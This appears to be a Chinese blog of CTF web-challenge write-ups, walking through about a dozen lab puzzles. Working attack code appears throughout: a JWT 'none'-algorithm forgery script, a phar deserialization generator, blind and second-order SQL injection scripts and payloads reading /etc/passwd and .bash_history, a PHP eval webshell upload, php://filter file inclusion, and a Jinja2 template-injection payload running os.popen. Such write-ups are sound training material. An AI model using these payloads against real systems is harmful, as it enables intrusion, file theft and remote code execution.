@[TOC]

# [HITCON 2017]SSRFme
脑子有点不够用了，先看其他师傅的
[参考博客](https://blog.csdn.net/qq_49422880/article/details/121430262)

# [b01lers2020]Welcome to Earth
302页面跳转，查看源码内容在/chase，抓包看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/9858f55051a649f39f8ce397e33482dc.png)

访问/leftt/
![在这里插入图片描述](https://img-blog.csdnimg.cn/b19d1c904c4b4b7b8bbe754286fe6256.png)
/door
发现里面没有路径提示，只有个check_open()函数，f12去js里面找一下
```js
function check_door() {
  var all_radio = document.getElementById("door_form").elements;
  var guess = null;

  for (var i = 0; i < all_radio.length; i++)
    if (all_radio[i].checked) guess = all_radio[i].value;

  rand = Math.floor(Math.random() * 360);
  if (rand == guess) window.location = "/open/";
  else window.location = "/die/";
}

```

/open的js脚本
```js
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function open(i) {
  sleep(1).then(() => {
    open(i + 1);
  });
  if (i == 4000000000) window.location = "/fight/";
}

```
/fight
```js
// Run to scramble original flag
//console.log(scramble(flag, action));
function scramble(flag, key) {
  for (var i = 0; i < key.length; i++) {
    let n = key.charCodeAt(i) % flag.length;
    let temp = flag[i];
    flag[i] = flag[n];
    flag[n] = temp;
  }
  return flag;
}

function check_action() {
  var action = document.getElementById("action").value;
  var flag = ["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"];

  // TODO: unscramble function
}


```

目力排序
![在这里插入图片描述](https://img-blog.csdnimg.cn/2929468b90424dd5a12ce1ded786aca8.png)

# [CISCN2019 总决赛 Day2 Web1]Easyweb
注册新用户登录，点击提交flag发现提示没有权限，转到f12source查看js脚本
```js
/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */

function login() {
    const username = $("#username").val();
    const password = $("#password").val();
    const token = sessionStorage.getItem("token");
    $.post("/api/login", {username, password, authorization:token})
        .done(function(data) {
            const {status} = data;
            if(status) {
                document.location = "/home";
            }
        })
        .fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
}

function register() {
    const username = $("#username").val();
    const password = $("#password").val();
    $.post("/api/register", {username, password})
        .done(function(data) {
            const { token } = data;
            sessionStorage.setItem('token', token);
            document.location = "/login";
        })
        .fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
}

function logout() {
    $.get('/api/logout').done(function(data) {
        const {status} = data;
        if(status) {
            document.location = '/login';
        }
    });
}

function getflag() {
    $.get('/api/flag').done(function(data) {
        const {flag} = data;
        $("#username").val(flag);
    }).fail(function(xhr, textStatus, errorThrown) {
        alert(xhr.responseJSON.message);
    });
}


```
提示用koa框架写的，所以查看框架结构[nodeJs 进阶Koa项目结构详解](https://www.cnblogs.com/wangjiahui/p/12660093.html)
![在这里插入图片描述](https://img-blog.csdnimg.cn/e620522646024a39ac3eea20f6f8a7b5.png)
查看controllers下的`api.js`
```js
const crypto = require('crypto');
const fs = require('fs')
const jwt = require('jsonwebtoken')

const APIError = require('../rest').APIError;

module.exports = {
    'POST /api/register': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || username === 'admin'){
            throw new APIError('register error', 'wrong username');
        }

        if(global.secrets.length > 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString('hex');
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});

        ctx.rest({
            token: token
        });

        await next();
    },

    'POST /api/login': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError('login error', 'username or password is necessary');
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
            throw new APIError('login error', 'no such secret id');
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: 'HS256'});

        const status = username === user.username && password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    'GET /api/flag': async (ctx, next) => {
        if(ctx.session.username !== 'admin'){
            throw new APIError('permission error', 'permission denied');
        }

        const flag = fs.readFileSync('/flag').toString();
        ctx.rest({
            flag
        });

        await next();
    },

    'GET /api/logout': async (ctx, next) => {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};

```
jwt验证，签名算法为HS256

![在这里插入图片描述](https://img-blog.csdnimg.cn/382001bbe6114428a7c6019ee4bd08a4.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/d029d6709bf246eaae3c24425198210a.png)
>原因：签名算法确保恶意用户在传输过程中不会修改JWT。但是标题中的alg字段可以更改为none。有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+‘.’+ payload +‘.’）并将其提交给服务器。

[来源](https://blog.csdn.net/shinygod/article/details/124035397)
```python
import jwt
token = jwt.encode(
{
  "secretid": [],
  "username": "admin",
  "password": "123456",
  "iat": 1649380156
},
algorithm="none",key="").encode(encoding='utf-8')

print(token)

```
登陆时替换用户名与authorization
![在这里插入图片描述](https://img-blog.csdnimg.cn/7b9d6cf0d1a048bc82e9e2bc91951b3b.png)


总结？思路是从已有的脚本资源中发现使用的框架，在了解了框架代码结构之后找到jwt认证，然后再伪造

# [SWPUCTF 2018]SimplePHP
传文件之后查看文件发现不能直接展示，发现了file参数

尝试读/etc/passwd没有效果，包含file.php出了代码
```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); # 目录限制
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); # 展示文件是直接高亮代码的
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```
发现有目录限制，包含一下upload_file.php
```php
<?php 
include 'function.php'; 
upload_file(); 
?>

```
看一下function.php
```php
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; # 改名加后缀
    //mkdir("upload",0777); # 新目录且有权限
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?> 

```

base.php
```php
<?php 
    session_start(); 
?> 
<!DOCTYPE html> 
<html> 
<head> 
    <meta charset="utf-8"> 
    <title>web3</title> 
    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"> 
    <script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script> 
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script> 
</head> 
<body> 
    <nav class="navbar navbar-default" role="navigation"> 
        <div class="container-fluid"> 
        <div class="navbar-header"> 
            <a class="navbar-brand" href="index.php">首页</a> 
        </div> 
            <ul class="nav navbar-nav navbra-toggle"> 
                <li class="active"><a href="file.php?file=">查看文件</a></li> 
                <li><a href="upload_file.php">上传文件</a></li> 
            </ul> 
            <ul class="nav navbar-nav navbar-right"> 
                <li><a href="index.php"><span class="glyphicon glyphicon-user"></span><?php echo $_SERVER['REMOTE_ADDR'];?></a></li> 
            </ul> 
        </div> 
    </nav> 
</body> 
</html> 
<!--flag is in f1ag.php-->
```
class.php
```php

<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

```php

<?php
class C1e4r
{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
}

$a = new C1e4r();
$b = new Show();
$a->str = $b;  //触发__tostring
$c = new Test();
$c->params['source'] = "/var/www/html/f1ag.php";//目标文件
$b->str['str'] = $c;  //触发__get;


$phar = new Phar("exp.phar"); //生成phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata($a); //触发类是C1e4r类
$phar->addFromString("text.txt", "test"); //签名
$phar->stopBuffering();

?>

```

# [NCTF2019]SQLi
>https://blog.csdn.net/l2872253606/article/details/125265138

正则注入
扫目录，设置延时--delay防止429

robots.txt
![在这里插入图片描述](https://img-blog.csdnimg.cn/e158aa4d53504503b799ed9e3d72ba9f.png)
hint.txt
```php
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";


If $_POST['passwd'] === admin's password,

Then you will get the flag;

```
payload：
username: \
passwd：||sql语句;%00
语句发生变化如下           
```sql
select * from users where username='\' and passwd='||sql;%00'
```
前单引号闭合，后单引号被00截断

```python
import requests
import string
import time

url= "http://13225f23-d92b-48bf-b571-093a9f79f5f7.node4.buuoj.cn:81/index.php"

password = ""

str = '_'+string.ascii_lowercase+string.digits

for i in range (1,50):
	print(i)
	for j in str:
		data = {

			'username':'\\',
			'passwd':'||passwd/**/regexp/**/"^{}";\x00'.format(password+j)
		}
		print(data)
		res = requests.post(url=url,data=data)
		if r"welcome.php" in res.text:
			password+=j
			print(password)
			break
		elif res.status_code == 429:
			time.sleep(0.5)

```

you_will_never_know7788990
登录即可


# [网鼎杯 2018]Comment
git泄露、爆破、二次注入

`dirsearch -u xxx -t 5 --delay 0.5 -e *`

`python2 githack http://xxx.com/.git/`

得到`write_do.php`
```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```
访问需要登录，爆破，线程池配置
![在这里插入图片描述](https://img-blog.csdnimg.cn/47235cb1eebc465a97b18d4cb3ca9b3a.png)
密码zhangwei666

f12console有提示查看git历史

git log --reflog
git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c

```php
   $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";

$sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
$sql = "select category from board where id='$bo_id'";

```

留言查看的地方没有过滤就进行输出

构造category：`asd',content=database(),/*`
留言处content：`*/#`
此处井号只是单行注释，不影响下面
```sql
$sql = "insert into comment
            set category = 'asd',content=database(),/*',
                content = '*/#',
                bo_id = '$bo_id'";

```

读用户
`a',content=(select (load_file('/etc/passwd'))),/*`
![在这里插入图片描述](https://img-blog.csdnimg.cn/1df060098ed34271958b708e66506f2b.png)
读历史
`a',content=(select (load_file('/home/www/.bash_history'))),/*`
![在这里插入图片描述](https://img-blog.csdnimg.cn/98f89da45b15499f83a6b546659e2500.png)
读tmp目录下的.DS_Store文件
`a',content=(select (hex(load_file('/tmp/html/.DS_Store')))),/*`

读出16进制内容，解码发现有一个文件名
![在这里插入图片描述](https://img-blog.csdnimg.cn/b095b53158d94777910729e6d954d690.png)

再load一下
`	a',content=(select (hex(load_file('/tmp/html/flag_8946e1ff1ee3e40f.php')))),/*`

![在这里插入图片描述](https://img-blog.csdnimg.cn/2c88af3520e4454db0abd0a69d14683d.png)
oh我就说，读/vaw/www/html目录下的，tmp目录下的不能用

# [NPUCTF2020]ezinclude
![在这里插入图片描述](https://img-blog.csdnimg.cn/f522235716704204ae2852b5a94312dd.png)
抓包
![在这里插入图片描述](https://img-blog.csdnimg.cn/6795e39dfbe9421c85421a94ba6eee21.png)
get传user空，pass=hash
![在这里插入图片描述](https://img-blog.csdnimg.cn/3ab6632da5794a55bf92d4c102e341ab.png)
页面跳转，抓包有
![在这里插入图片描述](https://img-blog.csdnimg.cn/461fae363d424d3c9c6d2a4a9ed9bf2c.png)
抓包访问之，
![在这里插入图片描述](https://img-blog.csdnimg.cn/61d9e4ca93d44cba8c8f0853e831d041.png)
传参/etc/passwd有回显，尝试data伪协议发现被禁，有过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/47ddb32266d643b89f21cb7a0703725f.png)
查看flflflflag.php源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/c5a9f700a2bd41679f82186a2bf6420b.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/b501086b38704b87b997b3b37522581b.png)
不能命令执行，根据前辈博客，尝试包含临时文件，利用PHP7 Segment Fault

```python

import requests
from io import BytesIO #BytesIO实现了在内存中读写bytes
payload = "<?php eval($_POST[cmd]);?>"
data={'file': BytesIO(payload.encode())}
url="http://b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"
r=requests.post(url=url,files=data,allow_redirects=False)

#来自https://blog.csdn.net/weixin_45646006/article/details/120817553

```

![在这里插入图片描述](https://img-blog.csdnimg.cn/3620c6d53489410b9fae29566d00de48.png)
蚁剑能连接但是没有什么权限，burp抓包传一下参数，phpinfo()
![在这里插入图片描述](https://img-blog.csdnimg.cn/f3ddb93c58d643a3902fef9bd4b22fb4.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3fe8c6cb909d483f9e5303f573c8a869.png)


# [HarekazeCTF2019]encode_and_encode

>[学习博客，参考此处](https://blog.csdn.net/RABCDXB/article/details/122724832)
打开页面，第三个链接有源码

```php

<?php
error_reporting(0);

// 显示源码
if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

// 过滤函数，不允许伪协议关键字
function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

// 通过POST传数据
$body = file_get_contents('php://input');
// 数据需要为json格式字符串
$json = json_decode($body, true);

// 参数键为page
if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
// file_get_contents指向page参数所指定的文件
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) { //对content也进行valid检测
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);


```
json_decode可以对unicode直接进行解码，但是函数匹配不到

```php

<?php
//\u0070\u0068\u0070是php的unicode编码
$body = '{"page":"\u0070\u0068\u0070"}';

echo $body;
$json = json_decode($body,true);
echo "\n";
var_dump($json);

```

所以思路就是将payload直接unicode编码传输
`php://filter/convert.base64-encode/resource=/flag`

captf帮一下忙吧
![在这里插入图片描述](https://img-blog.csdnimg.cn/df92457624d74200bf739827c4d243bc.png)
`{"page":"\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}`

![在这里插入图片描述](https://img-blog.csdnimg.cn/db18e67323aa4f53a8b22a9d3849dbf2.png)
# [CISCN2019 华东南赛区]Double Secret

文件secret，传参secret
`/secret?secret=12312124`

报错页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/23f05866c01941e283170094584cc63d.png)
使用RC4加密方式，且密钥已知，"HereIsTreasure"

后续使用了render_template_string()函数进行渲染

```python
# RC4是一种对称加密算法，那么对密文进行再次加密就可以得到原来的明文

import base64
from urllib.parse import quote


def rc4_main(key="init_key", message="init_message"):
    # print("RC4加密主函数")
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return crypt


def rc4_init_sbox(key):
    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可
    # print("原来的 s 盒：%s" % s_box)
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print("混乱后的 s 盒：%s"% s_box)
    return s_box


def rc4_excrypt(plain, box):
    # print("调用加密程序成功。")
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    # print("res用于加密字符串，加密后是：%res" %res)
    cipher = "".join(res)
    print("加密后的字符串是：%s" % quote(cipher))
    # print("加密后的输出(经过编码):")
    # print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
    return str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')


rc4_main("key", "text")

```

将{{7*7}}进行加密后传入
![在这里插入图片描述](https://img-blog.csdnimg.cn/7a47ed5332fb46a6917e3cbfdc51abca.png)
页面返回49，括号内表达式执行成功

jinja2模板执行读文件操作

`{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}`

加密后传入即可得到结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/ee3ced2d33414dc18cf76227c197289c.png)
最终

`.%14JP%C2%A6%01EQT%C2%94%C3%96%1A%C2%AA%C2%8D%C3%89%C3%A6%0B%C2%ACS8%C2%B8P%C3%A1~%19%C2%AE%07%C3%87m%C3%B30%C3%B2%24%C2%87Y%C3%9F%06%C3%A2%17%C3%9B%40%C2%9D%C2%B2%C3%9Dd%03%C2%AD%15%C2%B7%C2%A9yS%25%C3%96b%2B%C2%98%2C%0F%C2%8D%C3%B7Z%1E%C3%A5%C2%91%17%C3%B2%0E9E%23%C2%A9%00%C3%9D5%C3%A1%7B%C3%9D%7CA%2Aq%0C%C3%81%C3%84%5E%C2%B9%C2%B2%C3%AE%C2%8E%C3%B3%C2%9C `

![在这里插入图片描述](https://img-blog.csdnimg.cn/348063625fd042fbb40276e259ec4e25.png)

# [网鼎杯2018]Unfinish

https://blog.csdn.net/qq_46263951/article/details/118735000
二次注入，登陆显示用户名

```python

import requests
 
login_url='http://220.249.52.133:39445/login.php'
register_url='http://220.249.52.133:39445/register.php'
content=''
for i in range(1,20):
    data_register={'email':'15@%d'%i,'username':"0'+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+'0"%i,'password':'1'}
    #print(data)
    data_login={'email':'15@%d'%i,'password':'1'}
    requests.post(register_url,data=data_register)
    rr=requests.post(login_url,data=data_login)
    rr.encoding='utf-8'
    r=rr.text
    location=r.find('user-name')
    cont=r[location+17:location+42].strip()
    content+=cont
    print(cont)
#content=content.decode('hex').decode('hex')
print(content)
 
```

只是后面写出来，线程问题buu报429，拼一下吧


# [网鼎杯 2020 半决赛]AliceWebsite

```php

<?php
        $action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');
        if (file_exists($action)) {
            include $action;
        } else {
            echo "File not found!";
        }
?>

```

action=/flag
